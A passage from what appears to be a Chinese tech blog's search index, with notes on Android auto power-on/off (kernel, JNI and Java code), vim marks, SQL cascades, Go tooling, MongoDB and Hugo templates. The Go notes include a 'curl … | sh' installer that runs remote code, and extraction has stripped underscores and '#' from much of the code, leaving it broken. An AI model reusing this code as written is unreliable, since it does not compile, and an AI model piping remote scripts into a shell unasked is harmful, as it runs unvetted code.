解开迷题的秘诀是确定真正的约束，并在其中找出解决方法。有些约束是绝对的，必须受到尊重，有些约束是你想象出来的。有些迷题之所以有效，是诱使你很快就因为某些并不真正存在的约束而忽略了潜在的解决方案。“在盒子外面思考”鼓励我们找出可能不适用的约束并忽略他们。其实找到真正的盒子和这个是一个意思。\n11\n面对棘手的问题时，列出所有在你面前的可能途径。不要排除任何东西，不管它听起来是多么愚蠢。然后逐一检查列表中每一项，并解释为何不能采用某个特定的途径。你确定吗？你能证明？你需要的只是区分真正的约束和令人误解的约束的智慧。\n12\n有一种网球训练方法叫做“内在的网球”：花上数小时击球过网，并不特意追求准确性，而是用语言描述球击中的地方与目标的相对位置。其思想是训练你的下意识和反应能力，于是你的球技就会得到提高，而无需有意识地去了解怎样提高。","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-11 Android 自动开关机实现","title":"Android自动开关机实现","text":"Android自动开关机实现\n\n关于android自动关机，网上有很多应用程序和例子。 相对于自动开机来说，自动关机可以在应用层通过设置alarm来实现。而自动开机，网上的介绍就比较少了，因为它需要底层rtc时钟的支持。前段时间根据客户需求实现了自动开关机。在这里分享一下。\n\n简介\n\n我的实现是在设置程序里面增加一个接口，让用户设置自动开关机，这个自动开关机的设置可以参照闹钟的设置。关于自动关机，考虑到关机的时候，用户可能正有一些重要的操作，那么应该给用户一个机会去取消当前的关机。\n\n1）一个BroadcastReceiver, 接收如下信息：\n\n　　a) 自定义的ACTIONREQUESTPOWEROFF：设置auto power off时，通过AlarmManager设置的一个RTCWAKEUP时钟。当到设置的关机时间时，之前设置到AlarmManager的这个action会被广播。我们实现的这个BroadcastReceiver接收到这个消息后，就要开始power off流程\n\n　　b) 自定义的ACTIONREQUESTPOWERON：设置auto power on时，通过AlarmManager设置的一个RTCWAKEUP时钟。我们知道power on的应该设置一个rtc的alarm，那么这个RTCWAKEUP的alarm是做什么的呢？其实当用户设置自动关机的时候，我设置了2个时钟，一个是RTC时钟，用于关机状态下开机；还有一个就是这个RTCWAKEUP时钟。之所以设置这个时钟，其实是这样的，比如说你设置了周一到周五每天7点半自动开机，而周四早上你7点就打开了手机，这样到7点半的时候，之前设置的时钟就过期了，如果不重新设置的话，周五早上是不会自动开机的。所以这个时候，之前设置的RTCWAKEUP就接收到了这样的信息，在重新设置下次自动开机的时钟。\n\n　　c) BOOTCOMPLETE和TIMEZONE changed, Time set等时间相关的action：当系统开机完成或时间、时区发生改变时，都需要重新设置alarm。\n\n2）一个处理power off 的Service，当BroadcastReceiver接收到ACTIONREQUESTPOWEROFF，我们给用户一个机会去取消当前的自动关机。这个Service的作用就是启动一个无背景的页面，给用户提示。同时播放之前用户设置的提示音或振动。\n\n3）一个Activity：显示一个dialog提示用户要自动关机，并用一个计时器倒计时。当用户确认关机，或者计时器到时间的时候，就关机。否则取消当前关机，并重设下次自动关机alarm。\n\n自动关机的实现。自动关机的实现比较简单，这里主要说一下怎么设置alarm，和实现关机：\n\n1） 设置自动关机的alarm：\n\n   AlarmManager am = (AlarmManager) context\n               .getSystemService(Context.ALARMSERVICE);\n\n       Intent intent = new Intent(\n               \"com.android.settings.action.REQUESTPOWEROFF\");\n\n       PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0,\n               intent, PendingIntent.FLAGCANCELCURRENT);\n       am = (AlarmManager) context\n               .getSystemService(Context.ALARMSERVICE);\n       am.set(AlarmManager.RTCWAKEUP, time, pendingIntent);\n\n2）自动关机掉的是./frameworks/base/services/java/com/android/server/ShutdownActivity.java：\n\n       Intent newIntent = new Intent(Intent.ACTIONREQUESTSHUTDOWN);\n       newIntent.setFlags(Intent.FLAGACTIVITYNEWTASK);\n       startActivity(newIntent);\n\nIntent.ACTIONREQUESTSHUTDOWN是Intent里面一个隐藏的action。\n\n自动开机的实现。一直在做上层应用和framework，对于底层不是很熟悉。正好有同事之前做过关机闹铃，所以把他之前的实现稍加改动就可以了。在系统power off的状态下自动开机，我们需要设置一个rtc时钟，当用户设置自动开机时，由AlarmManagerService将时钟设置下去。这学要底层的支持。这里的实现是定义一个我们自己的rtc alarm type：\n\n1） 首先要在头文件里面定义：\n\n　　a) kernel/include/linux/androidalarm.h\ndefine ANDROIDALARMGETTIME(type)        ALARMIOW(4, type, struct timespec)\ndefine ANDROIDALARMSETRTC               IOW('a', 5, struct timespec)\n\n/ we define ANDROIDRTCALARMSET for auto power off /\ndefine ANDROIDRTCALARMSET               IOW('a', 7, int)\n\ndefine ANDROIDALARMBASECMD(cmd)         (cmd \u0026 ~(IOC(0, 0, 0xf0, 0)))\n\n　　b) bionic/libc/kernel/common/linux/androidalarm.h\n\n#define ANDROIDRTCALARMSET IOW('a', 7, int)\n\n2) 定义完成之后，还需要实现：在kernel/drivers/rtc/alarm-dev.c文件的alarmioctl方法里面，增加一个case，实现设置alarm\n\n   case ANDROIDRTCALARMSET:\n       {\n           unsigned int rtcalarmtime;\n           struct rtctime rtcnow;\n           if (copyfromuser(\u0026rtcalarmtime, (void _user )arg,\n               sizeof(rtcalarmtime))) {\n               rv = -EFAULT;\n               goto err1;\n           }\n           if (pmicrtcgettime(\u0026rtcnow) \u003c 0) {\n               rtcnow.sec = 0;\n               if (pmicrtcstart(\u0026rtcnow) \u003c 0) {\n                   printk(\"get and set rtc info failed\\n\");\n                   break;\n               }\n           }\n           pmicrtcdisablealarm(PMRTCALARM1);\n           rtcnow.sec += rtcalarmtime;\n           pmicrtcenablealarm(PMRTCALARM1, \u0026rtcnow);\n           break;\n       }\n\n当然不要忘记增加一个include：\n\ninclude mach/pmic.h\n\n3）在frameworks/base/services/jni/comandroidserverAlarmManagerService.cpp里面增加一个方法去设置时钟：\n\nstatic void androidserverAlarmManagerServiceupdateRtcAlarm(JNIEnv env, jobject obj, jint fd, jint seconds)\n{\nif HAVEANDROIDOS\n   int result = ioctl(fd, ANDROIDRTCALARMSET, \u0026seconds);\n   LOGE(\"set rtc alarm to %d later: %s\\n\", seconds, strerror(errno));\n   if (result \u003c 0)\n   {\n       LOGE(\"Unable to set rtc alarm to %d later: %s\\n\", seconds, strerror(errno));\n   }\nendif\n}\n\n还有就是不要忘记定义一下接口：\n\n{\"updateRtcAlarm\", \"(II)V\", (void*)androidserverAlarmManagerServiceupdateRtcAlarm},\n\n4） 在frameworks/base/services/java/com/android/server/AlarmManagerService.java里面定义native的设置alarm的方法，然后调用就可以实现将自动关机的alarm设置下去了：\n\n定义：private native void updateRtcAlarm(int fd, int seconds);\n\n调用：\n\n   public void setRepeating(int type, long triggerAtTime, long interval,\n           PendingIntent operation) {\n       if (operation == null) {\n           Slog.w(TAG, \"set/setRepeating ignored because there is no intent\");\n           return;\n       }\n       synchronized (mLock) {\n           Alarm alarm = new Alarm();\n           alarm.type = type;\n           alarm.when = triggerAtTime;\n           alarm.repeatInterval = interval;\n           alarm.operation = operation;\n\n           // Remove this alarm if already scheduled.\n           removeLocked(operation);\n\n           if (localLOGV) Slog.v(TAG, \"set: \" + alarm);\n\n           int index = addAlarmLocked(alarm);\n           if (index == 0) {\n               setLocked(alarm);\n           }\n\n           // Start to setup auto power on alarm\n           if ((alarm.type == AlarmManager.ELAPSEDREALTIMEWAKEUP) \u0026\u0026\n                               alarm.operation.getTargetPackage().equals(\"com.android.settings\")) {\n               updateRtcAlarm(mDescriptor, (int)((alarm.when - System.currentTimeMillis()) / 1000));\n           }\n           // End to setup auto power on alarm\n       }\n   }\n\n5）在应用层设置自动开机\n\n       AlarmManager am = (AlarmManager) context\n               .getSystemService(Context.ALARMSERVICE);\n       Intent intent = new Intent(\n               \"com.android.settings.action.REQUESTPOWERON\");\n       PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0,\n               intent, PendingIntent.FLAGCANCELCURRENT);\n       am = (AlarmManager) context\n               .getSystemService(Context.ALARMSERVICE);\n       am.set(AlarmManager.ELAPSEDREALTIME_WAKEUP, time, pendingIntent);\n\n总结\n\n1） 自动开机原理比较简单，但是需要底层的支持，所以对于做应用或者framework层的技术人员来说，实现起来稍微比较麻烦。\n2） 在设置自动开关机的时候，需要考虑的情况很多，比如是否设置时间/时区的改变，手机当前是开机还是关机状态等。","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 Troubleshooting","title":"toubleshooting","text":"---\n名词解释：\n\n    toubleshooting，有道在线词典的解释是：解决纷争；发现并解决故障。再来看一下维基百科的解释：Troubleshooting is a formof problem solving, often applied torepair failed products or processes. It is a logical, systematic search for thesource of a problem so that it can be solved, and so the product or process canbe made operational again.大致意思是：Troubleshooting是一种解决问题的方式，经常用于修复出了故障的产品或工艺品。为了能解决某个问题，troubleshooting需要进行逻辑地、系统地分析问题，达到系追本溯源，使产品或工艺品能重新运行起来。\n\n    即：它是一种解决问题所采取的一系列活动的总和。初始状态是问题，中间过程是shooting，最后结果是troubleshooted。","tags":null},{"location":"//blog.pytool.com/Edit/vim-marks","title":"vim marks","text":"在追踪代码时，经常跳转到很多新文件中，想回到原点时就比较麻烦了，这时候就需要 “书签” 了。\n\nbr\n\nBookmarks\n \n\n用 :help marks 来查看关于书签的说明：\n\n书签可以分为 3 类：\n\nlowercase marks\n\n    书签名只能为 'a - 'z，只在所在文件内有效，不能在文件之间跳转，不同书签名不能包含有相同字符\n\nuppercase  marks\n\n    书签名只能为 'A - 'Z，也叫文件书签，可以在文件之间跳转，不同书签名不能包含有相同字符\n\nnumbered marks\n\n    书签名只能为 '0 - '9，用 .viminfor 文件来设置\n\n使用字母 a-zA-Z 建立的书签能被保存下来，再次打开时仍然存在，而用数字 0-9 建立的书签在关闭文件后就被删除了，不能恢复，所以 一般使用 a-zA-Z 更多一点吧。\n\n知道这些最基本的东西就可以顺利使用书签了。\n\nP.S.\n\nhelp 文档中说 numbered marks 不能手动设置，实际上是可以的，不知道是不是我理解错了，不过这个应该不影响平常的使用。\n\n Usage\n\n常用的几个 Vim 内置的书签命令如下：\n\n设置书签 m{a-zA-Z}，如 ma\n\n删除书签 delm {marks}，如 delm a\n\n跳转书签\n\n    跳转有两种方式：\n\n    使用 backtick 键（数字 1 键左边），跳转到设置书签时光标所在的行和列，如 `a\n\n    使用单引号 '，跳转到书签所在行的第一个非空字符处（不包含列信息），如 'a\n\n    `` 回到到上次修改的位置\n\n列出所有书签 :marks\n\nbr\n\nVim-signature\n \n\n使用 Vim 书签时，最大的不方便之处是：书签是不可见的，也就是说我们输入命令之后，是无法看到书签是否建立成功了，外观上是看不出书签行和普通行的区别的。还好有个很不错的插件 vim-signature 可以帮助我们实现可视化的书签。\n\n在 github 项目上有这个插件的简单介绍，另外在 Vim 中也可以看 help 文档查阅详细帮助，这里只记录我用到简单配置。\n\n Install\n\n使用这个插件需要 vim 支持 sign 特性，使用命令 :echo has('signs') 来查看 vim 是否支持这个特性，如果结果是 1，则支持，如果结果是 0，需要重新编译 vim。\n\n使用 Vundle 安装：\n\n    Bundle 'vim-signature'\n\nUsage\n\n使用 :help signature 可以查看帮助文档。\n\n    mx           Toggle mark 'x' and display it in the leftmost column\n    dmx          Remove mark 'x' where x is a-zA-Z\n\n    m,           Place the next available mark\n    m.           If no mark on line, place the next available mark. Otherwise, remove (first)     existing mark.\n    m-           Delete all marks from the current line\n    mSpace     Delete all marks from the current buffer\n    ]`           Jump to next mark\n    [`           Jump to prev mark\n    ]'           Jump to start of next line containing a mark\n    ['           Jump to start of prev line containing a mark\n    `]           Jump by alphabetical order to next mark\n    `[           Jump by alphabetical order to prev mark\n    ']           Jump by alphabetical order to start of next line having a mark\n    '[           Jump by alphabetical order to start of prev line having a mark\n    m/           Open location list and display marks from current buffer\n\n    m[0-9]       Toggle the corresponding marker !@$%^\u0026*()\n    mS-[0-9]   Remove all markers of the same type\n    ]-           Jump to next line having a marker of the same type\n    [-           Jump to prev line having a marker of the same type\n    ]=           Jump to next line having a marker of any type\n    [=           Jump to prev line having a marker of any type\n    m?           Open location list and display markers from current buffer\n    mBS        Remove all markers\n\n而且 help 中列出了具体配置，我们可以对其修改，自定义快捷键。总结一下我常用的操作：\n\n设置书签 mx，比如 ma\n\n删除书签\n\n    直接在目标行重新输入 mx，旧书签就会被删除，并且设定到光标所在行\n\n    将光标移动到旧书签行，重新输入 mx\n\n    删除所有 lowercase + uppercase marks，mSpace\n\n    删除所有 numbered marks，mBS\n\n跳转书签\n\n    ]`，跳转到前一个书签\n\n    [`，跳转到后一个书签\n\n    ]-，跳转到之前同一类型的 numbered marks 书签行\n\n    [-，跳转到之后同一类型的 numbered marks 书签行\n\n[vim-signature]: https://github.com/kshenoy/vim-signature\n\nbr\n\nRef\n\nvim-signature\n\n像 IDE 一样使用 Vim","tags":null},{"location":"//blog.pytool.com/Post/数据库/2017-04-24 sql Foregin","title":"on update cascade 和on delete cascade 作用区别？","text":"SQL 约束（Constraints）\n\n在 SQL 中，我们有如下约束：\n\n    NOT NULL - 指示某列不能存储 NULL 值。\n    UNIQUE - 保证某列的每行必须有唯一的值。\n    PRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。\n    FOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。\n    CHECK - 保证列中的值符合指定的条件。\n    DEFAULT - 规定没有给列赋值时的默认值。\n\n这是数据库外键FOREGIN REFERENCES定义的一个可选项，用来设置当主键表中的被参考列的数据发生变化时，外键表中响应字段的变换规则的。update 则是主键表中被参考字段的值更新，delete是指在主键表中删除一条记录：\n\non update 和 on delete  后面可以跟的词语有四个[no action  ， set null ，  set default  ，cascade]\n    no action 表示 不做任何操作，\n    set null    表示在外键表中将相应字段设置为null\n    set default 表示设置为默认值\n    cascade 表示级联操作，就是说，如果主键表中被参考字段更新，外键表中也更新，主键表中的记录被删除，外键表中改行也相应删除\n\n1.如果linecenter（主表）中的一个lid被删除了，那么引用该id的从表中的所有记录也被删除。\n\n通常称为级联删除\n\n例如：\n\nSQL  create table test (id number(7) not null, name varchar2(20),  constraint pktest primary key (id));\n\nSQL  create table test1 (id number(7) not null, comments varchar(400), constraint fktest1 foreign key (id) references test (id));\n\nSQL  create table test2 (id number(7) not null, commects varchar(400), constraint fktest2 foreign key (id) references test (id) on delete cascade);\n\nSQL  insert into test values (1, 'abc');\n\n已创建 1 行。\n\nSQL  insert into test1 values (1, 'aaaaa');\n\n已创建 1 行。\n\nSQL  delete test;\ndelete test\nERROR 位于第 1 行:\nORA-02292: 违反完整约束条件 (YANGTK.FKTEST1) - 已找到子记录日志\n\nSQL  delete test1;\n\n已删除 1 行。\n\nSQL  delete test;\n\n已删除 1 行。\n\n关系表的级联更新： on update cascade\non delete cascade 是级联删除的意思\n意思是 当你更新或删除主键表时，那么外键表也会跟随一起更新或删除\n\nCREATE TABLE Countries(CountryId INT PRIMARY KEY)\nINSERT INTO Countries (CountryId) VALUES (1)\nINSERT INTO Countries (CountryId) VALUES (2)\nINSERT INTO Countries (CountryId) VALUES (3)\nGO\nCREATE TABLE Cities( CityId INT PRIMARY KEY ,CountryId INT REFERENCES Countries ON DELETE CASCADE);\nINSERT INTO Cities VALUES(1,1)\nINSERT INTO Cities VALUES(2,1)\nINSERT INTO Cities VALUES(3,2)\nGO\nCREATE TABLE Buyers(CustomerId INT PRIMARY KEY ,CityId INT REFERENCES Cities ON DELETE CASCADE);\nINSERT INTO Buyers  VALUES(1,1),\nINSERT INTO Buyers  VALUES(2,1)\nINSERT INTO Buyers  VALUES(3,2)\nGO\n\n命令：\nDELETE FROM Countries WHERE CountryId = 1\n结果：\nCountries：\nCountryId\n2\n3\nCities：\nCityId CountryId\n3 2\nBuyers：\nCustomerId CityId\n\nON UPDATE CASCADE的用法和ON DELETE CASCADE差不多","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/2016-10-04 golang","title":"golang","text":"go librarys\n  https://golang.org/pkg/\n  http://go-search.org/\n go\ninstall\n  curl -O https://storage.googleapis.com/golang/go1.7.3.linux-amd64.tar.gz\n  tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz\n     sudo tar -zxf go1.7.3.linux-amd64.tar.gz -C /usr/local\n 环境变量配置\nGOROOT: golang可执行程序本身的路径\n  export GOROOT=/usr/local/go/bin\nGOPATH: 当有多个GOPATH时，默认会将go get的内容放在第一个目录下[golang库的路径]\n  Windows是[; 分号 semicolon-separated]\n  Linux系统是[: 冒号 colon-separated]\n  export GOPATH=$HOME/work\n  export PATH=$PATH:$GOROOT/bin:$GOPATH/bin\nGo命令详解\ngo env 查看GO变量\n\ngo build\n    如果是普通包，当你执行go build命令后，不会产生任何文件。\n    如果是main包，当只执行go build命令后，会在当前目录下生成一个可执行文件。\n    如果需要在$GOPATH/bin木下生成相应的exe文件，需要执行go install 或者使用 go build -o 路径/a.exe。\ngo install 命令在内部实际上分成了两步操作：第一步是生成结果文件(可执行文件或者.a包)，第二步会把编译好的结果移到 $GOPATH/pkg 或者 $GOPATH/bin。\ngo get 命令本质上可以理解为：首先通过源码工具clone代码到src目录，然后执行go install; go get = git clone + go install\n  -d 只下载不安装\n  -f 只有在你包含了-u参数的时候才有效，不让-u去验证import中的每一个都已经获取了，这对于本地fork的包特别有用\n  -fix 在获取源码之后先运行fix，而后再进行编译和安装。\n  -t 同时也下载需要为运行测试所需要的包\n  -u 强制使用网络去更新包和它的依赖包 默认情况下，该命令只会从网络上下载本地不存在的代码包，而不会更新已有的代码包。 |\n  -v 显示执行的命令\ngo test 命令，会自动读取源码目录下面名为 test.go的文件，生成并运行测试用的可执行文件。输出的信息类似\n\nGo 语言包管理：gopm\ngo get -u github.com/gpmgo/gopm\n  list     list all dependencies of current project\n  gen      generate a gopmfile for current Go project\n  get      fetch remote package(s) and dependencies\n  bin      download and link dependencies and build binary\n  config   configure gopm settings\n  run      link dependencies and go run\n  test     link dependencies and go test\n  build    link dependencies and go build\n  install  link dependencies and go install\n  clean    clean all temporary files\n  update   check and update gopm resources including itself\n  help, h  Shows a list of commands or help for one command\n 包管理工具:govendor\nInstall\ngo get -u -v github.com/kardianos/govendor\n\n 使用\nexport GO15VENDOREXPERIMENT=1\n\n创建vendor\ngovendor init\ngovendor fetch golang.org/x/net/context\n\n Add existing GOPATH files to vendor.\ngovendor add +external\nView your work.\ngovendor list\n Look at what is using a package\ngovendor list -v fmt\nSpecify a specific version or revision to fetch\ngovendor fetch golang.org/x/net/context@a4bbce9fcae005b22ae5443f6af064d80a6f5a55\ngovendor fetch golang.org/x/net/context@v1    Get latest v1.. tag or branch.\ngovendor fetch golang.org/x/net/context@=v1  # Get the tag or branch named \"v1\".\n\nUpdate a package to latest, given any prior version constraint\ngovendor fetch golang.org/x/net/context\n\n Format your repository only\ngovendor fmt +local\n\nBuild everything in your repository only\ngovendor install +local\n\n Test your repository only\ngovendor test +local\n\ncd goproj \u0026 govendor init\ngoverdor --list\ngoverdor --list -v\nCopy existing dependencies from $GOPATH with govendor add/update.\nIf you ignore vendor/ /, restore dependencies with govendor sync.\nPull in new dependencies or update existing dependencies directly from remotes with govendor fetch.\nMigrate from legacy systems with govendor migrate.\n\n包管理工具:godep\ngodep save\n\n 包管理工具:glide\ncurl https://glide.sh/get | sh\nglide init\nedit glide.yaml\nglide update\nglide install\nglide get github.com/foo/bar#^1.2.3\n################################################################################\nvscode调试工具:delve\ngo get github.com/derekparker/delve/cmd/dlv\n\nanInt,  = strconv.Atoi(origStr)\n 无视错误\n 一个特殊的变量名是  （下划线）。任何赋给它的值都被丢弃。\n\n多个defer的执行顺序为“后进先出”；\ndefer、return、返回值三者的执行逻辑应该是：return最先执行，return负责将结果写入返回值中；接着defer开始执行一些收尾工作；最后函数携带当前返回值退出。\n\n一个新定义的或者没有任何指向的指针，有值 nil。在其他语言中，这经常被叫做空（NULL）指针，在 Go 中就是 nil\n import\n  1) import后面的最后一个元素应该是路径，就是目录，并非包名 使用的时包名\n  2) 同一个目录下只能有一个包名\n\n匿名函数 （闭包）\n赋值 fplus := func(x, y int) int { return x + y }\n直接运行 func(x, y int) int { return x + y } (3, 4)\n 函数方法 类的内部方法 a.poll\nfunc (a *Agent) Poll() error {\treturn nil }","tags":null},{"location":"//blog.pytool.com/Post/数据库/2015-04-01-mongodb","title":"mongodb","text":"selector\n类似于SQL语句中的where 。选择器是一个JSON对象，最简单的就是{}匹配所有文档。\n\n{field:value} 用来查找field值为 value的文档。\n{field1:value1,field2:value2} 相当于and\n还可以使用$lt,$lte,$gt,$gte,$ne 用来处理小于、小于等于、大于、大于等于和不等于操作。例如：\n{field1:value1,field2:{$gt:100}}\n$exists 用来匹配字段是否存在\n$in 用来匹配查询文档在传入的数组参数中是否存在匹配值，例如：{field:{$in:['apple','orange']}}- 如果想用OR而不是AND 来处理选择条件可以使用$or，再给它一个我们要匹配的数组。例如：{field1:value1,$or:[{field2:value2},{field3:value3}]}\n\nfind\nprojection(投影)\n可选参数，是要检索或排除的字段列表。例如：\nfind({},{field:1})\n\n默认情况下，id 总是返回。可以显示的排除，如：{id:0}\n\n除了_id 字段，不能把检索和排除混用。\n\n排序\nfind().sort({field1:1,field2:-1})\n1表示升序，2表示降序\n\n分页\n通过limit和skip实现。例如：\n\nfind().sort({field:1}).limit(2).skip(1)\n\n计数\nfind().count()\ncreate\n\nupdate\n覆盖\nupdate(selector,{field1:value1,field2:value2})\n$set\nupdate(selector,{$set:{field1:value1}})\n$inc\n$push\n\nupsert\n在文档中找到匹配值时更新它，无匹配值时插入新值。使用方法就是在update时，写入第三个参数{upsert:true}。\n例如：\nupdate(selector,{field1:value1},{upsert:true})\n\n批量更新\nupdate默认只更新单个文档。使用multi选项。例如：\nupdate(selector,{field1:value1},{multi:true})\ndelete\n\n参考链接\n\nhttps://github.com/geminiyellow/the-little-mongodb-book/blob/master/zh-cn/mongodb.markdown","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/builtin","title":"golang中builtin包说明","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/hugo/hugo_template","title":"Hugo 模板template","text":"模板变量\n\n如果说模板是待填充的网页，则模板变量是用来填充模板的内容。Hugo 内置了许多可以在模板中访问的变量，这些变量可以分为以下几种类型\n\n网站变量\n\n  通过网站变量，我们可以访问网站级别的配置和数据。\n\n    .Site.BaseURL \t\t\t配置文件中为网站指定的 basse URL\n  .Site.RSSLink \t\t\t网站的 RSS 链接\n  .Site.Taxonomies \t\t网站所有的分类标签\n  .Site.Pages\t\t\t\t网站所有页面（仅含当前语言）\n  .Site.AllPages\t\t\t网站所有页面（含多语言）\n  .Site.Params\t\t\t配置文件中通过 params 定义的网站参数\n  .Site.Sections\t\t\t网站所有 Section（也即网站的顶级目录）\n  .Site.Title\t\t\t\t配置文件中为网站指定的 title\n  .Site.Author\t\t\t配置文件中为网站指定的 author\n  .Site.Copyright\t\t\t配置文件中为网站指定的 copyright\n  .Site.LastChange\t\t网站最后更新时间，格式跟内容文档头部 date 保持一致\n  .Site.Data\t\t\t\t网站自定义数据文件的访问接口\n  .Site.RegularPages\t\t网站中所有常规页面\n  .Site.Files\t\t\t\t网站所有源文件\n  .Site.Menus\t\t\t\t网站所有菜单\n  .Site.LanguageCode\t\t配置文件中为网站指定的 language code\n  .Site.DisqusShortname\t配置文件中为网站指定的 disqus 评论id\n  .Site.GoogleAnalytics   配置文件中为网站指定的 google analytics tracking code\n  .Site.Permalinks\t\t配置文件中为网站指定的 permalink format\n  .Site.BuildDrafts\t\t配置文件中为网站指定的 build drafts\n  .Site.IsMultiLingual\t网站是否支持多语言\n  .Site.Language\t\t\t配置文件中指定的 language\n  \n页面变量\n\n  通过页面变量，我们可以访问内容文档级别的配置和数据。\n\n    .Title\t\t\t\t\t内容文档的标题\n  .Content\t\t\t\t内容文档的内容\n  .Date\t\t\t\t\t内容文档的日期\n  .PublishDate\t\t\t页面发布日期\n  .FuzzyWordCount\t\t\t内容的近似字数\n  .WordCount\t\t\t\t内容的字数\n  .Type\t\t\t\t\t内容文档的内容类型\n  .URL\t\t\t\t\t页面的相对 URL\n  .UniqueID\t\t\t\t内容文档路径的md5值\n  .Weidht\t\t\t\t\t内容文档中定义的排序权重\n  .Kind\t\t\t\t\t页面类型\n  .Params\t\t\t\t\t内容文档头部定义的任意元数据都可以通过 .Params 来访问（不同定义如何命名，均以字母小写的名字访问）\n  \t\t\t\t\t\t补充：网站变量中也有 .Site.Params 来定义网站参数，一般来说页面参数比网站参数更具体，\n  \t\t\t\t\t\t可以使用模板函数 $.Param \"headerimage\" 来访问网站和页面的同名参数\n  .IsHome\t\t\t\t\t页面是否为首页\n  .IsPage\t\t\t\t\t是否为常规内容页面\n  .Next\t\t\t\t\t下一个页面（根据页面发布日期）\n  .Prev\t\t\t\t\t上一个页面（根据页面发布日期）\n  .NextInSection\t\t\t当天Section中的下一个页面（根据页面分布日期）\n  .PrevInSection\t\t\t当天Section中的上一个页面（根据页面分布日期）\n  .TableOfContents\t\t页面目录\n  .Permalink\t\t\t\t页面的永久链接\n  .RelPermalink\t\t\t页面永久链接的相对路径\n  .RawContent\t\t\t\t页面的 Markdown 内容，当想要在网站中集成https://github.com/gnab/remark时，就需要提取页面的 Markdown 内容了\n  .ReadingTime\t\t\t页面大概需要花费的阅读时间\n  .Section\t\t\t\t页面所在 Section\n  .Summary\t\t\t\t页面摘要\n  .Truncated\t\t\t\t摘要是否截断页面\n  .Description\t\t\t描述\n  .Keywords\t\t\t\t关键词\n  .LinkTitle\t\t\t\t链接到当前页面时使用的 title\n  .ExpiryDate\t\t\t\t页面失效日期\n  .Draft\t\t\t\t\t页面是否为草稿\n  .IsTranslated\t\t\t页面是否有多语言版本\n  .Translations\t\t\t页面的多语言页面\n  .Lang\t\t\t\t\t语言\n  .Language\t\t\t\t语言对象\n  \n文件变量\n\n  当页面的生成来源于内容文档时，可以访问内容文档文件相关信息。\n\n    .File.Path\t\t\t\t内容文档的相对路径，比如：content/posts/first.en.md\n  .File.Dir\t\t\t\t内容文档所在目录\n  .File.LogicalName\t\t内容文档文件名，比如：first.en.md\n  .File.TranslationBaseName 内容文档根文件名，比如：first\n  .File.Ext\t\t\t\t内容文档扩展名，比如：md\n  .File.Lang\t\t\t\t内容文档的语言\n  \nHugo 变量\n\n    .Hugo.Generator\t\t\tHugo 版本号的 meta tag，例如：meta name=\"generator\" content=\"Hugo 0.15\" /\n  .Hugo.Version\t\t\tHugo 二进制程序版本号\n  \n模板变量的作用域问题\n\n单页模板、Section 列表模板以及 Taxonomy 列表模板均可以访问网站变量和页面变量，此外Taxonomy 列表模板可以访问代表其自身的 .Data.Singular 变量。\n\n 模板角色\n\n模板文件混杂了 HTML 代码和模板标识符，用来设计网页布局的。Hugo 支持 Go 语言的 HTML 模板库来对网站进行布局规划，虽然模板文件本质上没有不同，可 Hugo 结合常用网站布局结构的需要将模板分为了几种角色，下面将依次介绍这些模板角色\n\n也即页面类型\n\npage home section taxonomy or taxonomy Term\n\nrss sitemap robotsTXT 404\n\n首页模板\n\nHugo 使用首页模板（homepage template）来渲染网站首页。一般来说网站首页同其它页面具有不一样的风格，因此需要专门为其使用特定的模板进行渲染。Hugo 在生成网站时，通常会依次从下面路径中查找首页模板，将找到的第一个文件作为首页模板：\n/layouts/index.html\n/layouts/default/list.html\n/layouts/default/single.html\n/themes/THEME/layouts/index.html\n/themes/THEME/layouts/default/list.html\n/themes/THEME/layouts/default/single.html\n也即默认首页模板是 index.html ，当该文件不存在时，依次使用 list.html 和 single.html 来充当首页模板。另外首页模板中可以通过模板变量 .Data.Pages 来访问网站中所有内容文档，通常我们会遍历该变量在首页创建一个文档展示列表，不过Hugo 不会对模板的创建有任何限制，如何定义首页模板完全取决于自己。\n\n 单页模板\n\nHugo 使用单页模板（single template）来渲染内容文档。换句话说，内容文档的内容将嵌入单页模板设计好的网页结构中，以此生成网页。那么当生成静态网站时，Hugo 会使用哪个单页模板来渲染内容文档呢？Hugo 会依次从下面路径列表中查找可用的单页模板，将找到的第一个单页模板文件作为当前内容文档的渲染模板：\n/layouts/TYPE/LAYOUT.html\n/layouts/SECTION/LAYOUT.html\n/layouts/TYPE/single.html\n/layouts/SECTION/single.html\n/layouts/default/single.html\n/themes/THEME/layouts/TYPE/LAYOUT.html\n/themes/THEME/layouts/SECTION/LAYOUT.html\n/themes/THEME/layouts/TYPE/single.html\n/themes/THEME/layouts/SECTION/single.html\n/themes/THEME/layouts/default/single.html\n其中 TYPE 表示内容文档的类型名称，SECTION 表示内容文档的 Section ，THEME 表示主题名称，LAYOUT 表示内容文档指定的模板名。TYPE 和 LAYOUT 可分别通过内容文档头部的 type （默认跟所在 Section 同名）和 layout （默认为单页模板）进行设置 ，SECTION 则由内容文档磁盘路径对应的 Section 决定。\n\n可以看出 Hugo 默认会先从 TYPE 和 SECTION 这些模板目录中查找文档指定的布局 LAYOUT ，再查找相应的单页模板，然后再从网站源默认的布局目录 default 中查找单页模板，最后会查找当前主题的相关布局目录，可见 Hugo 奉行的准则是：先精确查找，再回退默认。\n\n在单页模板中可以访问网站变量和页面变量以及模板函数，通常我们会将内容文档的内容嵌入到单页模板中，有时也许还想为模板创建一个侧变量用来显示相关信息等，怎样定义单页模板完全取决于自己。\n\n一般情况下，当我们为网站添加过主题之后，主题都会有单页模板的，如果想要覆盖主题中定义的单页模板，可以在网站源的模板目录下面创建相应的单页模板，或者直接创建单页模板 layouts/default/single.html 作为内容文档未找到单页模板时的默认模板。\n\n内容视图\n\nHugo 使用内容视图（content views）来以不同于单页模板的方式展示内容文档。比如有时，我们只想要展示文档摘要或者文档列表项而非整个文档，内容视图在此时就特别有用了。\n\n内容视图也是普通的模板文件，Hugo 查找内容视图时会根据当前文档的内容类型进行查找，也就是说同名的内容视图对不同内容类型渲染效果是不同的。Hugo 